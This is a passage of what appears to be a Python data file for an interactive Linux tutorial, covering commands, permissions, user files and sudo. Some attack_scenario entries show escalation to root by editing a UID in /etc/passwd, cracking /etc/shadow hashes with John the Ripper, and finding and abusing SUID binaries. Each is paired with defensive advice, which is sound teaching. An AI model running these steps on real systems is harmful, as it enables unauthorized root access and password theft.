%Cpu(s):  2.3 us,  0.8 sy, 96.5 id,  0.4 wa
MiB Mem :   7982.5 total,   1234.8 free,   3421.2 used

    PID USER      PR  NI    VIRT    RES  S  %CPU  %MEM     TIME+ COMMAND
   1234 alice     20   0 4523456 172032 S   5.3   2.1   0:12.45 firefox
    415 root      20   0   98436  45672 S   0.7   0.5   0:08.23 mysqld""",
        "explanation": "Interactive real-time viewer. Refreshes every 3s. Sort with P (CPU), M (memory), kill with k. Press q to quit.",
        "flags": [{"flag": "q", "desc": "Quit"}, {"flag": "k", "desc": "Kill process"}, {"flag": "M", "desc": "Sort by memory"}],
        "simulation": [
            {"step": 1, "title": "Read initial", "desc": "top reads /proc for all processes", "from": "top", "to": "/proc", "data": "312 processes", "color": "#3498db"},
            {"step": 2, "title": "Compute deltas", "desc": "Δ CPU ticks / Δ time", "from": "top", "to": "CPU Calc", "data": "5.3% CPU", "color": "#f39c12"},
            {"step": 3, "title": "Render", "desc": "Prints to terminal via ncurses", "from": "top", "to": "Terminal", "data": "Live display", "color": "#27ae60"},
            {"step": 4, "title": "Loop", "desc": "Sleeps 3s, repeats", "from": "top", "to": "Loop", "data": "Refresh...", "color": "#e74c3c"}
        ]
    },
    {
        "command": "kill -9 PID", "desc": "Force-kill process by PID", "category": "Processes",
        "output": """$ kill -9 5678

$ ps -p 5678
   PID TTY          TIME CMD
(no output — process gone)""",
        "explanation": "Sends SIGKILL (signal 9) — kernel force-terminates the process. Cannot be caught or ignored. Use as last resort after regular kill fails.",
        "flags": [{"flag": "-9", "desc": "SIGKILL (force)"}, {"flag": "-15", "desc": "SIGTERM (default)"}, {"flag": "-l", "desc": "List all signals"}],
        "simulation": [
            {"step": 1, "title": "kill -9 sent", "desc": "User runs kill -9 5678", "from": "User", "to": "Kernel", "data": "SIGKILL", "color": "#e74c3c"},
            {"step": 2, "title": "Kernel bypasses handler", "desc": "No handler invoked — direct kill", "from": "Kernel", "to": "Process", "data": "Task killed", "color": "#c0392b"},
            {"step": 3, "title": "Cleanup", "desc": "Memory, fds, sockets freed", "from": "Kernel", "to": "Resources", "data": "172 MB freed", "color": "#27ae60"}
        ]
    },
    {
        "command": "systemctl status service", "desc": "Check systemd service", "category": "Processes",
        "output": """$ systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled)
     Active: active (running) since Mon 2024-01-15 09:00:12 UTC; 5h ago
   Main PID: 890 (sshd)
      Tasks: 1 (limit: 4647)
     Memory: 4.8M
     CGroup: /system.slice/ssh.service
             └─890 "sshd: /usr/sbin/sshd -D [listener]"

Jan 15 09:00:12 host systemd[1]: Started ssh.service.""",
        "explanation": "Shows service state, PID, memory, and recent logs. The colored dot at start indicates: green=running, white=stopped, red=failed.",
        "flags": [{"flag": "--no-pager", "desc": "No pager"}, {"flag": "-l", "desc": "Full lines"}, {"flag": "-n N", "desc": "Last N log lines"}],
        "simulation": [
            {"step": 1, "title": "Query systemd", "desc": "systemctl asks for state", "from": "systemctl", "to": "systemd", "data": "GetUnit(ssh)", "color": "#3498db"},
            {"step": 2, "title": "Fetch metadata", "desc": "Reads state + cgroup info", "from": "systemd", "to": "State DB", "data": "active (running)", "color": "#f39c12"},
            {"step": 3, "title": "Fetch logs", "desc": "Last 10 entries from journald", "from": "systemd", "to": "journald", "data": "Log lines", "color": "#9b59b6"},
            {"step": 4, "title": "Render", "desc": "Format + print", "from": "systemctl", "to": "Terminal", "data": "Status shown", "color": "#27ae60"}
        ]
    },
    {
        "command": "chmod 755 file", "desc": "Change file permissions", "category": "Permissions",
        "output": """$ ls -la script.sh
-rw-r--r-- 1 alice alice 512 Jan 15 14:23 script.sh

$ chmod 755 script.sh

$ ls -la script.sh
-rwxr-xr-x 1 alice alice 512 Jan 15 14:23 script.sh""",
        "explanation": "Changes file permissions. Octal: 4=read, 2=write, 1=execute. 755 = owner rwx, group r-x, others r-x. Symbolic mode also works: chmod +x script.sh.",
        "flags": [{"flag": "+x", "desc": "Add execute"}, {"flag": "-x", "desc": "Remove execute"}, {"flag": "u+s", "desc": "Set SUID"}, {"flag": "g+s", "desc": "Set SGID"}],
        "simulation": [
            {"step": 1, "title": "Parse mode", "desc": "chmod converts 755 to rwxr-xr-x", "from": "chmod", "to": "Parser", "data": "7=rwx, 5=r-x", "color": "#3498db"},
            {"step": 2, "title": "chmod() syscall", "desc": "Kernel updates inode mode", "from": "chmod", "to": "Kernel", "data": "chmod(script.sh, 0755)", "color": "#f39c12"},
            {"step": 3, "title": "Verify", "desc": "Inode mode bits updated", "from": "Kernel", "to": "FS", "data": "Mode → rwxr-xr-x", "color": "#27ae60"}
        ]
    },
    {
        "command": "chown user:group file", "desc": "Change file owner", "category": "Permissions",
        "output": """$ ls -la file.txt
-rw-r--r-- 1 root root 512 Jan 15 14:23 file.txt

$ sudo chown alice:devs file.txt

$ ls -la file.txt
-rw-r--r-- 1 alice devs 512 Jan 15 14:23 file.txt""",
        "explanation": "Changes file owner and/or group. Only root can change owner. The owner can change their file's group to a group they belong to.",
        "flags": [{"flag": "-R", "desc": "Recursive"}, {"flag": "--reference", "desc": "Use another file's owner"}],
        "simulation": [
            {"step": 1, "title": "Check permission", "desc": "Only root can chown to another user", "from": "chown", "to": "Kernel", "data": "CAP_CHOWN required", "color": "#e74c3c"},
            {"step": 2, "title": "chown() syscall", "desc": "Kernel updates inode UID/GID", "from": "chown", "to": "Kernel", "data": "chown(file, alice, devs)", "color": "#f39c12"},
            {"step": 3, "title": "Verify", "desc": "New owner shown in ls", "from": "Kernel", "to": "FS", "data": "alice:devs", "color": "#27ae60"}
        ]
    },
    {
        "command": "whoami", "desc": "Show current username", "category": "Users",
        "output": "$ whoami\nalice",
        "explanation": "Prints the username of the current effective user. Different from who (logged-in users) and id (full UID/GID info).",
        "flags": [],
        "simulation": [
            {"step": 1, "title": "geteuid() syscall", "desc": "Shell asks kernel for effective UID", "from": "whoami", "to": "Kernel", "data": "geteuid() → 1000", "color": "#3498db"},
            {"step": 2, "title": "Lookup username", "desc": "Kernel looks up /etc/passwd", "from": "Kernel", "to": "/etc/passwd", "data": "1000 → alice", "color": "#f39c12"},
            {"step": 3, "title": "Print", "desc": "Displays username", "from": "whoami", "to": "Terminal", "data": "alice", "color": "#27ae60"}
        ]
    },
    {
        "command": "id", "desc": "Show UID, GID, groups", "category": "Users",
        "output": """$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),27(sudo),100(users)""",
        "explanation": "Shows your user ID, primary group ID, and all supplementary groups. Essential for understanding permissions.",
        "flags": [{"flag": "-u", "desc": "Only UID"}, {"flag": "-g", "desc": "Only GID"}, {"flag": "-Gn", "desc": "Only group names"}],
        "simulation": [
            {"step": 1, "title": "getuid/getgid", "desc": "Kernel returns numeric IDs", "from": "id", "to": "Kernel", "data": "uid=1000 gid=1000", "color": "#3498db"},
            {"step": 2, "title": "getgroups", "desc": "Kernel returns supplementary groups", "from": "id", "to": "Kernel", "data": "[27, 100]", "color": "#f39c12"},
            {"step": 3, "title": "Resolve names", "desc": "Lookup /etc/passwd + /etc/group", "from": "id", "to": "/etc", "data": "sudo, users", "color": "#27ae60"}
        ]
    },
    {
        "command": "sudo command", "desc": "Run command as root", "category": "Users",
        "output": """$ sudo apt update
[sudo] password for alice:
Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease
Reading package lists... Done""",
        "explanation": "Runs one command with root privileges. Requires YOUR password (not root's) and that you're in the sudoers file or sudo/wheel group.",
        "flags": [{"flag": "-i", "desc": "Interactive root shell"}, {"flag": "-u user", "desc": "Run as another user"}, {"flag": "-l", "desc": "List allowed commands"}],
        "simulation": [
            {"step": 1, "title": "sudo reads config", "desc": "Checks /etc/sudoers + /etc/sudoers.d/", "from": "sudo", "to": "/etc", "data": "User alice allowed", "color": "#3498db"},
            {"step": 2, "title": "Prompt password", "desc": "Verify user's identity", "from": "sudo", "to": "User", "data": "Password prompt", "color": "#f39c12"},
            {"step": 3, "title": "Verify", "desc": "PAM authenticates", "from": "sudo", "to": "PAM", "data": "Auth OK", "color": "#9b59b6"},
            {"step": 4, "title": "Run as root", "desc": "seteuid(0) then exec command", "from": "sudo", "to": "Kernel", "data": "apt as root", "color": "#27ae60"}
        ]
    },
    {
        "command": "useradd newuser", "desc": "Create a new user", "category": "Users",
        "output": """$ sudo useradd -m -s /bin/bash bob

$ id bob
uid=1002(bob) gid=1002(bob) groups=1002(bob)

$ ls /home
alice  bob""",
        "explanation": "Creates a new user. -m creates the home directory, -s sets the login shell, -G adds supplementary groups. On Debian/Ubuntu, adduser is friendlier.",
        "flags": [{"flag": "-m", "desc": "Create home"}, {"flag": "-s", "desc": "Set shell"}, {"flag": "-G", "desc": "Add groups"}, {"flag": "-u", "desc": "Specify UID"}],
        "simulation": [
            {"step": 1, "title": "Parse options", "desc": "useradd reads flags", "from": "useradd", "to": "Parser", "data": "-m -s /bin/bash", "color": "#3498db"},
            {"step": 2, "title": "Allocate UID", "desc": "Reads /etc/login.defs for UID range", "from": "useradd", "to": "/etc", "data": "UID=1002", "color": "#f39c12"},
            {"step": 3, "title": "Update /etc/passwd", "desc": "Add new line to passwd", "from": "useradd", "to": "/etc/passwd", "data": "bob:x:1002:1002...", "color": "#9b59b6"},
            {"step": 4, "title": "Update /etc/group", "desc": "Create primary group", "from": "useradd", "to": "/etc/group", "data": "bob:x:1002:", "color": "#e67e22"},
            {"step": 5, "title": "Update /etc/shadow", "desc": "Add locked password entry", "from": "useradd", "to": "/etc/shadow", "data": "bob:!:19745", "color": "#c0392b"},
            {"step": 6, "title": "Create home", "desc": "mkdir /home/bob with skeleton files", "from": "useradd", "to": "/home", "data": "/home/bob created", "color": "#27ae60"}
        ]
    },
    {
        "command": "ip addr", "desc": "Show network interfaces", "category": "Network",
        "output": """$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.1.10/24 brd 192.168.1.255 scope global eth0""",
        "explanation": "Modern replacement for ifconfig. Shows interfaces, IPs, MACs, and state. Replaces older net-tools.",
        "flags": [{"flag": "a", "desc": "Show all (default)"}, {"flag": "up", "desc": "Only UP interfaces"}, {"flag": "brief", "desc": "Compact output"}],
        "simulation": [
            {"step": 1, "title": "Netlink query", "desc": "ip asks kernel for interfaces", "from": "ip", "to": "Kernel", "data": "RTM_GETLINK", "color": "#3498db"},
            {"step": 2, "title": "Kernel responds", "desc": "Returns all interface info", "from": "Kernel", "to": "ip", "data": "eth0, lo", "color": "#f39c12"},
            {"step": 3, "title": "Format + print", "desc": "Human-readable output", "from": "ip", "to": "Terminal", "data": "Interfaces listed", "color": "#27ae60"}
        ]
    },
    {
        "command": "ping host", "desc": "Test connectivity", "category": "Network",
        "output": """$ ping -c 4 google.com
PING google.com (142.250.185.78) 56(84) bytes of data.
64 bytes from 142.250.185.78: icmp_seq=1 ttl=115 time=12.3 ms
64 bytes from 142.250.185.78: icmp_seq=2 ttl=115 time=11.8 ms
--- google.com ping statistics ---
4 packets transmitted, 4 received, 0% packet loss""",
        "explanation": "Sends ICMP Echo Requests to test reachability. -c limits count. Measures round-trip time and packet loss.",
        "flags": [{"flag": "-c N", "desc": "Count"}, {"flag": "-i N", "desc": "Interval (sec)"}, {"flag": "-W N", "desc": "Timeout"}],
        "simulation": [
            {"step": 1, "title": "Resolve hostname", "desc": "DNS lookup for google.com", "from": "ping", "to": "DNS", "data": "142.250.185.78", "color": "#3498db"},
            {"step": 2, "title": "Build ICMP packet", "desc": "Create echo request", "from": "ping", "to": "Socket", "data": "ICMP Echo Request", "color": "#f39c12"},
            {"step": 3, "title": "Send + wait", "desc": "Kernel sends, awaits reply", "from": "Kernel", "to": "Network", "data": "12.3 ms", "color": "#9b59b6"},
            {"step": 4, "title": "Print stats", "desc": "Shows RTT + packet loss", "from": "ping", "to": "Terminal", "data": "0% loss", "color": "#27ae60"}
        ]
    }
]

# ==================== LINUX: PERMISSIONS (with modal data) ====================
LINUX_PERMISSIONS = {
    "rwx_explained": [
        {"sym": "r", "name": "Read", "num": 4, "file": "View file contents (cat, less)", "dir": "List directory contents (ls)", "output": "$ ls -la file.txt\n-rw------- 1 alice alice 512 Jan 15 14:23 file.txt\n\n# Owner can read:\n$ cat file.txt\nHello World\n\n# Others cannot:\n$ sudo -u bob cat file.txt\ncat: file.txt: Permission denied", "simulation": [
            {"step": 1, "title": "Check mode bit", "desc": "Kernel checks read bit for user", "from": "Kernel", "to": "Inode", "data": "r=1", "color": "#27ae60"},
            {"step": 2, "title": "Grant/Deny", "desc": "Allow or deny read()", "from": "Kernel", "to": "Process", "data": "Allowed", "color": "#27ae60"}
        ]},
        {"sym": "w", "name": "Write", "num": 2, "file": "Modify file contents", "dir": "Create/delete files in directory"},
        {"sym": "x", "name": "Execute", "num": 1, "file": "Run as program/script", "dir": "Enter the directory (cd)"}
    ],
    "who": ["u = User (owner)", "g = Group", "o = Others (everyone else)", "a = All (u+g+o)"],
    "common_modes": [
        {"octal": "777", "binary": "111 111 111", "meaning": "rwxrwxrwx — Everyone full access (BAD!)", "example": "Never use on real files"},
        {"octal": "755", "binary": "111 101 101", "meaning": "rwxr-xr-x — Owner full, others read+execute", "example": "Executable scripts, directories"},
        {"octal": "644", "binary": "110 100 100", "meaning": "rw-r--r-- — Owner write, others read", "example": "Regular files, configs"},
        {"octal": "600", "binary": "110 000 000", "meaning": "rw------- — Owner only", "example": "Private files, .ssh keys"},
        {"octal": "400", "binary": "100 000 000", "meaning": "r-------- — Owner read only", "example": "Read-only secrets"},
        {"octal": "SUID", "binary": "u+s", "meaning": "rwsr-xr-x — Runs as owner of file", "example": "/usr/bin/passwd"}
    ],
    "example_ls": """$ ls -la /home/alice
total 32
drwxr-xr-x 6 alice alice 4096 Jan 15 10:00 .
drwxr-xr-x 3 root  root  4096 Jan 10 09:00 ..
-rw-r--r-- 1 alice alice  220 Jan 10 09:00 .bash_logout
drwx------ 2 alice alice 4096 Jan 12 15:00 .ssh
-rwxr-xr-x 1 alice alice  512 Jan 15 10:00 script.sh
-rwsr-xr-x 1 root  root  68208 Jan 10 09:00 /usr/bin/passwd

Breakdown:
-rw-r--r--  alice alice    → Regular file, owner can read+write
drwx------  alice alice    → Directory, ONLY alice can access (~/.ssh)
-rwxr-xr-x  alice alice    → Executable script, everyone can execute
-rwsr-xr-x  root  root     → SUID! Runs as root"""
}

LINUX_PASSWD_FILE = {
    "path": "/etc/passwd",
    "readable_by": "Everyone (world-readable)",
    "purpose": "Maps usernames to UIDs, home directories, and default shells",
    "fields": [
        {"num": 1, "name": "Username", "example": "alice", "desc": "Login name"},
        {"num": 2, "name": "Password", "example": "x", "desc": "Historically the hash. Now 'x' means 'see /etc/shadow'"},
        {"num": 3, "name": "UID", "example": "1000", "desc": "User ID. 0=root, 1-999=system, 1000+=regular"},
        {"num": 4, "name": "GID", "example": "1000", "desc": "Primary group ID"},
        {"num": 5, "name": "GECOS", "example": "Alice Smith,,,", "desc": "Comment field (name, phone, etc.)"},
        {"num": 6, "name": "Home", "example": "/home/alice", "desc": "Home directory path"},
        {"num": 7, "name": "Shell", "example": "/bin/bash", "desc": "Login shell (nologin = can't login)"}
    ],
    "example_lines": [
        {"line": "root:x:0:0:root:/root:/bin/bash", "explain": "Root user. UID 0 = god mode. /root is home."},
        {"line": "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin", "explain": "System account for daemons. Cannot log in."},
        {"line": "alice:x:1000:1000:Alice Smith,,,:/home/alice:/bin/bash", "explain": "Regular user 'alice' with UID 1000."},
        {"line": "bob:x:1001:1001::/home/bob:/bin/sh", "explain": "Regular user with /bin/sh shell."}
    ],
    "attack_scenario": {
        "title": "What if someone changes UID in /etc/passwd?",
        "example": "$ cat /etc/passwd | grep alice\nalice:x:1000:1000:Alice,,,:/home/alice:/bin/bash\n\n$ sudo sed -i 's/alice:x:1000/alice:x:0/' /etc/passwd\n\n$ cat /etc/passwd | grep alice\nalice:x:0:0:Alice,,,:/home/alice:/bin/bash\n\n$ su - alice\nPassword: (alice's normal password)\n# whoami\nroot\n# id\nuid=0(root) gid=0(root) groups=0(root)",
        "result": "⚠️ USER 'alice' IS NOW ROOT! Simply changing UID 1000 → 0 grants full root privileges. This is why /etc/passwd must be protected.",
        "defense": "Monitor /etc/passwd for changes (auditd, tripwire, AIDE). Only root can edit it. Regular users cannot modify it — but a root compromise or a misconfigured SUID binary can."
    }
}

LINUX_SHADOW_FILE = {
    "path": "/etc/shadow",
    "readable_by": "Root ONLY (permission 640 or 000)",
    "purpose": "Stores the actual password HASHES + aging info",
    "fields": [
        {"num": 1, "name": "Username", "example": "alice", "desc": "Matches /etc/passwd"},
        {"num": 2, "name": "Password Hash", "example": "$6$xyz$...", "desc": "$id$salt$hash — see hash types below"},
        {"num": 3, "name": "Last Change", "example": "19745", "desc": "Days since Jan 1, 1970 when password was last changed"},
        {"num": 4, "name": "Min Age", "example": "0", "desc": "Min days before user can change password (0=anytime)"},
        {"num": 5, "name": "Max Age", "example": "99999", "desc": "Max days before password must change (99999=never)"},
        {"num": 6, "name": "Warn", "example": "7", "desc": "Days before expiry to warn user"},
        {"num": 7, "name": "Inactive", "example": "", "desc": "Days after expiry before account is disabled"},
        {"num": 8, "name": "Expire", "example": "", "desc": "Absolute expiry date (days since epoch)"},
        {"num": 9, "name": "Reserved", "example": "", "desc": "Unused — reserved for future"}
    ],
    "hash_types": [
        {"prefix": "$1$", "algorithm": "MD5", "security": "❌ Broken — crackable in seconds"},
        {"prefix": "$2a$ / $2b$ / $2y$", "algorithm": "bcrypt", "security": "✅ Strong"},
        {"prefix": "$5$", "algorithm": "SHA-256", "security": "⚠️ OK but slow on CPU"},
        {"prefix": "$6$", "algorithm": "SHA-512", "security": "✅ Standard on modern Linux"},
        {"prefix": "$y$", "algorithm": "yescrypt", "security": "✅ Modern (Debian 11+)"},
        {"prefix": "!", "algorithm": "Locked", "security": "🔒 Account locked — no password login"},
        {"prefix": "*", "algorithm": "No password", "security": "🔒 Account has no password — cannot login"}
    ],
    "example_lines": [
        {"line": "root:$6$Xk9...:19745:0:99999:7:::", "explain": "Root with SHA-512 hash. Password never expires."},
        {"line": "alice:$6$Yz8...:19745:0:99999:7:::", "explain": "Regular user with SHA-512 hash."},
        {"line": "bob:!:19745:0:99999:7:::", "explain": "Locked account (! = no login possible)."},
        {"line": "daemon:*:19745:0:99999:7:::", "explain": "No password (* = never had one)."}
    ],
    "attack_scenario": {
        "title": "Cracking /etc/shadow with John the Ripper",
        "example": "$ sudo cat /etc/shadow\nroot:$6$Xk9dfg$gH8...:19745:0:99999:7:::\nalice:$6$Yz8asd$kL9...:19745:0:99999:7:::\n\n$ sudo unshadow /etc/passwd /etc/shadow > hashes.txt\n\n$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\nLoaded 2 password hashes (sha512crypt)\npassword123      (alice)\ntoor             (root)\n2g 0:00:00:32 DONE",
        "result": "⚠️ WEAK PASSWORDS ARE CRACKED IN SECONDS! SHA-512 is cryptographically strong, but if the password itself is 'password123', it doesn't matter.",
        "defense": "Use strong, unique passwords. Enable 2FA. Use pam_cracklib to enforce password policy. Monitor with faillog/lastb."
    }
}

LINUX_GROUPS = {
    "path": "/etc/group",
    "purpose": "Defines groups and their members",
    "fields": [
        {"num": 1, "name": "Group Name", "example": "sudo"},
        {"num": 2, "name": "Password", "example": "x", "desc": "Rarely used — 'x' means group password in /etc/gshadow"},
        {"num": 3, "name": "GID", "example": "27", "desc": "Group ID"},
        {"num": 4, "name": "Members", "example": "alice,bob", "desc": "Comma-separated list of users (excluding those whose primary group this is)"}
    ],
    "example_lines": [
        {"line": "root:x:0:", "explain": "Root group, GID 0"},
        {"line": "sudo:x:27:alice,bob", "explain": "Users alice and bob can use sudo"},
        {"line": "wheel:x:10:alice", "explain": "On RHEL/CentOS, 'wheel' group grants sudo access"},
        {"line": "developers:x:1001:alice,charlie", "explain": "Custom group with two developers"}
    ],
    "important_groups": [
        {"name": "root", "gid": "0", "privilege": "Full system access"},
        {"name": "sudo", "gid": "27", "privilege": "Can run sudo (Debian/Ubuntu)"},
        {"name": "wheel", "gid": "10", "privilege": "Can run sudo (RHEL/CentOS)"},
        {"name": "adm", "gid": "4", "privilege": "Can read system logs"},
        {"name": "docker", "gid": "999", "privilege": "Can run docker (root-equivalent!)"},
        {"name": "disk", "gid": "6", "privilege": "Direct disk access (root-equivalent!)"},
        {"name": "shadow", "gid": "42", "privilege": "Can read /etc/shadow"}
    ]
}

LINUX_SUDO = {
    "what_is_sudo": "sudo (Superuser DO) lets regular users run specific commands as root or another user, based on rules in /etc/sudoers.",
    "vs_su": [
        {"su": "Switch user — requires target user's password (usually root's)", "sudo": "Run one command — requires YOUR password"},
        {"su": "Starts a new shell as another user", "sudo": "Runs a single command and returns"},
        {"su": "All-or-nothing access", "sudo": "Granular control via /etc/sudoers"}
    ],
    "sudoers_syntax": [
        {"line": "root    ALL=(ALL:ALL) ALL", "explain": "Root can run anything, anywhere, as anyone"},
        {"line": "alice   ALL=(ALL:ALL) ALL", "explain": "Alice can run any command as root (full sudo)"},
        {"line": "%sudo   ALL=(ALL:ALL) ALL", "explain": "% means group — everyone in 'sudo' group gets full access"},
        {"line": "bob     ALL=(ALL) NOPASSWD: ALL", "explain": "Bob gets sudo WITHOUT password prompt (dangerous!)"},
        {"line": "charlie ALL=(ALL) /usr/bin/apt, /usr/bin/systemctl", "explain": "Charlie can only run apt and systemctl as root"},
        {"line": "Default env_editor=/usr/bin/nano", "explain": "Changes the default editor for visudo"}
    ],
    "adding_user_to_sudo": [
        "sudo usermod -aG sudo alice        # Debian/Ubuntu",
        "sudo usermod -aG wheel alice       # RHEL/CentOS/Fedora",
        "sudo visudo                         # Edit /etc/sudoers manually",
        "sudo visudo -f /etc/sudoers.d/alice # Use drop-in file (best practice)"
    ],
    "suid_explained": {
        "what": "SUID (Set User ID) is a special permission that makes a file run AS ITS OWNER, not as the user who executed it.",
        "why": "Used when a program needs elevated privileges for a specific task. Example: /usr/bin/passwd needs root to update /etc/shadow.",
        "how_to_spot": "ls -la shows 's' instead of 'x' in the owner's execute position:\n  -rwsr-xr-x 1 root root /usr/bin/passwd\n     ^ s = SUID",
        "finding_suid": "find / -perm -4000 -type f 2>/dev/null",
        "dangerous_suid": [
            "/usr/bin/nmap (old versions — can spawn shell!)",
            "/usr/bin/find",
            "/usr/bin/vim",
            "/usr/bin/bash",
            "/usr/bin/cp",
            "/usr/bin/python3",
            "/usr/bin/perl",
            "/usr/bin/less",
            "/usr/bin/more",
            "/usr/bin/man",
            "/usr/bin/env",
            "/usr/bin/awk"
        ],
        "exploitation_example": {
            "scenario": "SUID binary that runs /bin/sh",
            "command": "$ find / -perm -4000 2>/dev/null | grep -i bash\n/usr/local/bin/backup\n\n$ ls -la /usr/local/bin/backup\n-rwsr-xr-x 1 root root 16512 /usr/local/bin/backup\n\n$ /usr/local/bin/backup\n# whoami\nroot",
            "explanation": "The 'backup' binary has SUID + calls execve('/bin/sh') internally. When we run it, we get a root shell because we 'inherit' the SUID owner's privilege."
        }
    }
}

LINUX_SHELLS = [
    {"name": "sh", "full": "Bourne Shell", "year": "1977", "features": ["Basic scripting", "POSIX standard"], "pros": "Portable, tiny, in every Unix", "cons": "No history, no tab completion, no arrays", "color": "#7f8c8d"},
    {"name": "bash", "full": "Bourne-Again Shell", "year": "1989", "features": ["Command history", "Tab completion", "Arrays", "Arithmetic", "Pipelines"], "pros": "Default on Linux, huge feature set, backward compatible with sh", "cons": "Complex syntax", "color": "#27ae60"},
    {"name": "zsh", "full": "Z Shell", "year": "1990", "features": ["Everything bash has", "Advanced globbing", "Themes (Oh-My-Zsh)", "Better autocompletion"], "pros": "Best interactive experience", "cons": "Slower startup, less universal", "color": "#f39c12"},
    {"name": "fish", "full": "Friendly Interactive SHell", "year": "2005", "features": ["Syntax highlighting", "Autosuggestions", "Sane defaults"], "pros": "Great for beginners", "cons": "Not POSIX — scripts must be rewritten", "color": "#3498db"},
    {"name": "ksh", "full": "Korn Shell", "year": "1983", "features": ["POSIX", "Advanced scripting"], "pros": "Solid middle ground", "cons": "Not default on Linux", "color": "#9b59b6"},
    {"name": "dash", "full": "Debian Almquist Shell", "year": "1997", "features": ["Fast POSIX sh"], "pros": "Faster than bash for scripts", "cons": "Minimal features", "color": "#e74c3c"}
]

LINUX_PROCESSES = [
    {
        "command": "ps aux",
        "desc": "Snapshot of all running processes",
        "category": "Viewing",
        "flags": [
            {"flag": "a", "desc": "Show processes from all users"},
            {"flag": "u", "desc": "Display user-oriented format"},
            {"flag": "x", "desc": "Include processes without a controlling terminal"}
        ],
        "output": """USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 168564 11204 ?        Ss   09:00   0:03 /sbin/init
root         2  0.0  0.0      0     0 ?        S    09:00   0:00 [kthreadd]
root       342  0.0  0.2  26844 18912 ?        Ss   09:00   0:00 /lib/systemd/systemd-journald
root       415  0.1  0.5  98436 45672 ?        Ss   09:00   0:08 /usr/sbin/mysqld
alice     1234  0.5  2.1 4523456 172032 ?      Sl   10:15   0:12 firefox
alice     2890  0.0  0.0  16848  3456 pts/0    Ss   14:22   0:00 bash
alice     2910  0.0  0.0  20104  4128 pts/0    R+   14:23   0:00 ps aux""",
        "explanation": "One-shot snapshot of every process on the system. Columns show user, PID, CPU%, memory%, virtual size, RSS, terminal, state, start time, CPU time, and the full command. Ideal for scripting and logs.",
        "simulation": [
            {"step": 1, "title": "Kernel exposes /proc", "desc": "Every process has a /proc/PID/ directory", "from": "Kernel", "to": "/proc", "data": "/proc/1 /proc/342...", "color": "#3498db"},
            {"step": 2, "title": "ps reads /proc", "desc": "ps iterates through /proc/PID/stat and /proc/PID/cmdline", "from": "ps", "to": "/proc", "data": "Reading task info", "color": "#f39c12"},
            {"step": 3, "title": "Format output", "desc": "Combines data and applies user-format (u flag)", "from": "ps", "to": "Formatter", "data": "USER PID %CPU ...", "color": "#9b59b6"},
            {"step": 4, "title": "Print table", "desc": "Sorted by PID, printed to stdout", "from": "Formatter", "to": "Terminal", "data": "Snapshot printed", "color": "#27ae60"}
        ]
    },
    {
        "command": "top",
        "desc": "Real-time process monitor (press q to quit)",
        "category": "Monitoring",
        "flags": [
            {"flag": "q", "desc": "Quit top"},
            {"flag": "k", "desc": "Kill a process by PID"},
            {"flag": "M", "desc": "Sort by memory usage"},
            {"flag": "P", "desc": "Sort by CPU usage (default)"},
            {"flag": "1", "desc": "Show individual CPU cores"}
        ],
        "output": """top - 14:23:45 up 5:23,  2 users,  load average: 0.15, 0.22, 0.18
Tasks: 312 total,   1 running, 311 sleeping,   0 stopped,   0 zombie
%Cpu(s):  2.3 us,  0.8 sy,  0.0 ni, 96.5 id,  0.4 wa,  0.0 hi,  0.0 si
MiB Mem :   7982.5 total,   1234.8 free,   3421.2 used,   3326.5 buff/cache
MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   4055.5 avail Mem

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
   1234 alice     20   0 4523456 172032  98765 S   5.3   2.1   0:12.45 firefox
    415 root      20   0   98436  45672  12345 S   0.7   0.5   0:08.23 mysqld
   2890 alice     20   0   16848   3456   2560 S   0.3   0.0   0:00.12 bash""",
        "explanation": "Interactive real-time process viewer. Refreshes every 3 seconds by default. Shows CPU, memory, swap summary at top plus per-process stats below. Can sort, kill, and inspect processes live.",
        "simulation": [
            {"step": 1, "title": "Initial read", "desc": "top reads /proc for all processes", "from": "top", "to": "/proc", "data": "Read 312 processes", "color": "#3498db"},
            {"step": 2, "title": "Compute deltas", "desc": "Compares CPU ticks between intervals", "from": "top", "to": "CPU Calculator", "data": "Δ ticks / Δ time", "color": "#f39c12"},
            {"step": 3, "title": "Sort processes", "desc": "Sorts by CPU% (default) or key pressed", "from": "top", "to": "Sorter", "data": "Top 20 by CPU", "color": "#9b59b6"},
            {"step": 4, "title": "Render screen", "desc": "Prints to terminal using ncurses", "from": "top", "to": "Terminal", "data": "Live display", "color": "#27ae60"},
            {"step": 5, "title": "Wait 3s", "desc": "Sleeps, then repeats forever", "from": "top", "to": "Loop", "data": "Refresh...", "color": "#e74c3c"}
        ]
    },
    {
        "command": "htop",
        "desc": "Nicer version of top (install separately)",
        "category": "Monitoring",
        "flags": [
            {"flag": "F2", "desc": "Setup — configure display"},
            {"flag": "F3", "desc": "Search for a process"},
            {"flag": "F4", "desc": "Filter processes"},
            {"flag": "F5", "desc": "Tree view (shows parents)"},
            {"flag": "F9", "desc": "Kill a process"},
            {"flag": "u", "desc": "Show only one user's processes"}
        ],
        "output": """  1  [||||||||                   25.3%]   Tasks: 312, 145 thr; 1 running
  2  [||||||                     18.7%]   Load average: 0.15 0.22 0.18
  3  [|||                         8.2%]   Uptime: 5:23:45
  4  [||                          4.5%]
  Mem[|||||||||||||||||    3.42G/7.80G]   Swp[               0K/2.00G]

  PID USER      PRI  NI  VIRT   RES   SHR S CPU% MEM%   TIME+  Command
 1234 alice      20   0 4.32G 168M 96.4M S  5.3  2.1  0:12.45 firefox
  415 root       20   0 96.1M 44.6M 12.1M S  0.7  0.5  0:08.23 mysqld
 2890 alice      20   0 16.4M  3.4M  2.5M S  0.3  0.0  0:00.12 bash""",
        "explanation": "Colorful, mouse-friendly alternative to top. Shows per-core CPU usage, easier navigation, tree view, and simple kill. Must be installed: `sudo apt install htop`.",
        "simulation": [
            {"step": 1, "title": "Same data source", "desc": "htop reads /proc just like top", "from": "htop", "to": "/proc", "data": "Read processes", "color": "#3498db"},
